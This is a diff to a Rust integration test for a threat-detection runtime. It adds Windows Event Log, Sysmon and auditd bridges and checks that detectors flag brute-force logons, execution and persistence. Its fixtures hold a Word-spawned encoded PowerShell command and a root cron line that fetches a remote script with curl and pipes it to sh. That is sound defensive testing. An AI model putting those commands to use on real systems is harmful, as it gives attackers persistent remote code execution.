@@ -1,3 +1,5 @@
+#![allow(clippy::unwrap_used, clippy::expect_used)]
+
 use axum::{Router, routing::get};
 use std::collections::BTreeSet;
 use std::fs;
@@ -7,9 +9,9 @@ use std::sync::Arc;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use swarm_core::agent::{SwarmAgent, SwarmEnvironment, SwarmMode};
 use swarm_core::config::{
-    CloudTrailBridgeConfig, FieldMappingConfig, GenericJsonBridgeConfig,
+    AuditdBridgeConfig, CloudTrailBridgeConfig, FieldMappingConfig, GenericJsonBridgeConfig,
     GenericJsonPayloadMappingConfig, JsonFileSourceConfig, SentinelBridgeConfig, SwarmConfig,
-    TelemetryBridgeConfig, TelemetrySourceConfig,
+    SysmonBridgeConfig, TelemetryBridgeConfig, TelemetrySourceConfig, WindowsEventLogBridgeConfig,
 };
 use swarm_core::pheromone::ThreatClass;
 use swarm_core::types::AgentId;
@@ -18,6 +20,7 @@ use swarm_pheromone::{ConfiguredPheromoneSubstrate, DepositQuery, PheromoneSubst
 use swarm_runtime::bridge_runtime::{BridgeRuntimeRegistry, bridge_health_report};
 use swarm_runtime::config::load_config;
 use swarm_runtime::control::build_composite_detector;
+use swarm_runtime::detection::metrics::{CriticalPathMetrics, encode_metrics};
 use swarm_runtime::whisker_agent::WhiskerAgent;
 use tokio::net::TcpListener;
 use tokio::sync::{mpsc, watch};
@@ -148,6 +151,56 @@ fn config_with_concurrent_bridges(
                             success_path: "/auth/success".to_string(),
                             user_path: Some("/auth/user".to_string()),
                         },
+                    },
+                }),
+            }),
+        },
+    ];
+    Ok(config)
+}
+
+fn config_with_host_log_bridges(
+    windows_path: &Path,
+    sysmon_path: &Path,
+    auditd_path: &Path,
+) -> Result<SwarmConfig, Box<dyn std::error::Error>> {
+    let mut config = load_config(default_config_path())?;
+    config.detection.strategy = "suspicious_scripting".to_string();
+    config.detection.strategies = vec![
+        "suspicious_scripting".to_string(),
+        "lateral_movement".to_string(),
+        "persistence".to_string(),
+    ];
+    config.runtime.telemetry_sources = vec![
+        TelemetrySourceConfig {
+            name: "windows-security".to_string(),
+            subject: String::new(),
+            bridge: Some(TelemetryBridgeConfig::WindowsEventLog {
+                config: Box::new(WindowsEventLogBridgeConfig {
+                    source: JsonFileSourceConfig {
+                        path: windows_path.display().to_string(),
+                    },
+                }),
+            }),
+        },
+        TelemetrySourceConfig {
+            name: "sysmon-primary".to_string(),
+            subject: String::new(),
+            bridge: Some(TelemetryBridgeConfig::Sysmon {
+                config: Box::new(SysmonBridgeConfig {
+                    source: JsonFileSourceConfig {
+                        path: sysmon_path.display().to_string(),
+                    },
+                }),
+            }),
+        },
+        TelemetrySourceConfig {
+            name: "auditd-primary".to_string(),
+            subject: String::new(),
+            bridge: Some(TelemetryBridgeConfig::Auditd {
+                config: Box::new(AuditdBridgeConfig {
+                    source: JsonFileSourceConfig {
+                        path: auditd_path.display().to_string(),
                     },
                 }),
             }),
@@ -330,5 +383,194 @@ async fn sentinel_bridge_registry_emits_normalized_infrastructure_health_event()
         .await
         .map_err(std::io::Error::other)?
         .map_err(std::io::Error::other)??;
+    Ok(())
+}
+
+#[tokio::test]
+async fn host_log_bridge_registry_feeds_detectors_and_reports_metrics()
+-> Result<(), Box<dyn std::error::Error>> {
+    let windows_path = temp_fixture_path("windows-event-log");
+    let sysmon_path = temp_fixture_path("sysmon");
+    let auditd_path = temp_fixture_path("auditd");
+
+    fs::write(
+        &windows_path,
+        [
+            serde_json::to_string(&serde_json::json!({
+                "Event": {
+                    "System": {
+                        "EventID": 4625,
+                        "EventRecordID": 5001,
+                        "TimeCreated": { "@SystemTime": "2026-04-13T18:00:00Z" },
+                        "Computer": "win-host-03"
+                    },
+                    "EventData": {
+                        "LogonType": "10",
+                        "IpAddress": "198.51.100.50",
+                        "TargetUserName": "alice"
+                    }
+                }
+            }))?,
+            serde_json::to_string(&serde_json::json!({
+                "Event": {
+                    "System": {
+                        "EventID": 4625,
+                        "EventRecordID": 5002,
+                        "TimeCreated": { "@SystemTime": "2026-04-13T18:00:10Z" },
+                        "Computer": "win-host-03"
+                    },
+                    "EventData": {
+                        "LogonType": "10",
+                        "IpAddress": "198.51.100.50",
+                        "TargetUserName": "alice"
+                    }
+                }
+            }))?,
+            serde_json::to_string(&serde_json::json!({
+                "Event": {
+                    "System": {
+                        "EventID": 4625,
+                        "EventRecordID": 5003,
+                        "TimeCreated": { "@SystemTime": "2026-04-13T18:00:20Z" },
+                        "Computer": "win-host-03"
+                    },
+                    "EventData": {
+                        "LogonType": "10",
+                        "IpAddress": "198.51.100.50",
+                        "TargetUserName": "alice"
+                    }
+                }
+            }))?,
+        ]
+        .join("\n"),
+    )?;
+
+    fs::write(
+        &sysmon_path,
+        serde_json::to_string(&serde_json::json!({
+            "Event": {
+                "System": {
+                    "EventID": 1,
+                    "EventRecordID": 7001,
+                    "TimeCreated": { "@SystemTime": "2026-04-13T18:00:05Z" },
+                    "Computer": "win-host-03"
+                },
+                "EventData": {
+                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                    "CommandLine": "powershell.exe -nop -enc SQBFAFgA",
+                    "User": "ACME\\alice"
+                }
+            }
+        }))?,
+    )?;
+
+    fs::write(
+        &auditd_path,
+        serde_json::to_string(&serde_json::json!({
+            "type": "SYSCALL",
+            "serial": 8001,
+            "timestamp": "2026-04-13T18:00:30Z",
+            "host": "linux-a",
+            "syscall": "openat",
+            "exe": "/bin/bash",
+            "comm": "bash",
+            "path": "/etc/cron.d/evil",
+            "content_preview": "* * * * * root /usr/bin/curl https://example.invalid/a.sh | sh"
+        }))?,
+    )?;
+
+    let config = config_with_host_log_bridges(&windows_path, &sysmon_path, &auditd_path)?;
+    let detector = Arc::new(build_composite_detector(&config.detection)?);
+    let substrate = ConfiguredPheromoneSubstrate::from_config(&config.pheromone)?;
+    let registry = BridgeRuntimeRegistry::from_config(&config)?;
+    let bridge_health = registry.shared_health();
+    let metrics = CriticalPathMetrics::new();
+    let (telemetry_tx, telemetry_rx) = mpsc::channel(16);
+    let (_shutdown_tx, shutdown_rx) = watch::channel(false);
+    let handles = registry.spawn(telemetry_tx, shutdown_rx, Some(metrics.clone()));
+
+    tokio::time::timeout(Duration::from_secs(2), async {
+        for handle in handles {
+            handle.await.map_err(std::io::Error::other)?;
+        }
+        Ok::<(), std::io::Error>(())
+    })
+    .await??;
+
+    let health = bridge_health_report(&bridge_health);
+    assert_eq!(health.configured, 3);
+    assert_eq!(health.ok, 3);
+    assert_eq!(health.entries.len(), 3);
+    assert_eq!(
+        health
+            .entries
+            .iter()
+            .map(|entry| (
+                entry.name.as_str(),
+                entry.source_id.as_str(),
+                entry.events_processed
+            ))
+            .collect::<BTreeSet<_>>(),
+        BTreeSet::from([
+            ("auditd-primary", "auditd", 1),
+            ("sysmon-primary", "sysmon", 1),
+            ("windows-security", "windows_event_log", 3),
+        ])
+    );
+
+    let mut agent = WhiskerAgent::new(
+        AgentId::new("whisker", "primary"),
+        telemetry_rx,
+        detector,
+        substrate.clone(),
+        config.pheromone.clone(),
+    );
+    let actions = agent
+        .tick(&whisker_env())
+        .await
+        .map_err(std::io::Error::other)?;
+    assert_eq!(actions.len(), 3);
+
+    let deposits = substrate.query_deposits(DepositQuery::recent(10)).await?;
+    assert_eq!(deposits.len(), 3);
+    assert_eq!(
+        deposits
+            .iter()
+            .map(|deposit| deposit.threat_class.clone())
+            .collect::<BTreeSet<_>>(),
+        BTreeSet::from([
+            ThreatClass::Execution,
+            ThreatClass::LateralMovement,
+            ThreatClass::Persistence,
+        ])
+    );
+
+    let encoded = encode_metrics(&metrics);
+    assert!(
+        encoded.contains(
+            "swarm_bridge_events_processed{bridge=\"windows-security\",source_id=\"windows_event_log\"} 3"
+        ) || encoded.contains(
+            "swarm_bridge_events_processed{source_id=\"windows_event_log\",bridge=\"windows-security\"} 3"
+        )
+    );
+    assert!(
+        encoded.contains(
+            "swarm_bridge_events_processed{bridge=\"sysmon-primary\",source_id=\"sysmon\"} 1"
+        ) || encoded.contains(
+            "swarm_bridge_events_processed{source_id=\"sysmon\",bridge=\"sysmon-primary\"} 1"
+        )
+    );
+    assert!(
+        encoded.contains(
+            "swarm_bridge_events_processed{bridge=\"auditd-primary\",source_id=\"auditd\"} 1"
+        ) || encoded.contains(
+            "swarm_bridge_events_processed{source_id=\"auditd\",bridge=\"auditd-primary\"} 1"
+        )
+    );
+
+    let _ = fs::remove_file(windows_path);
+    let _ = fs::remove_file(sysmon_path);
+    let _ = fs::remove_file(auditd_path);
     Ok(())
 }
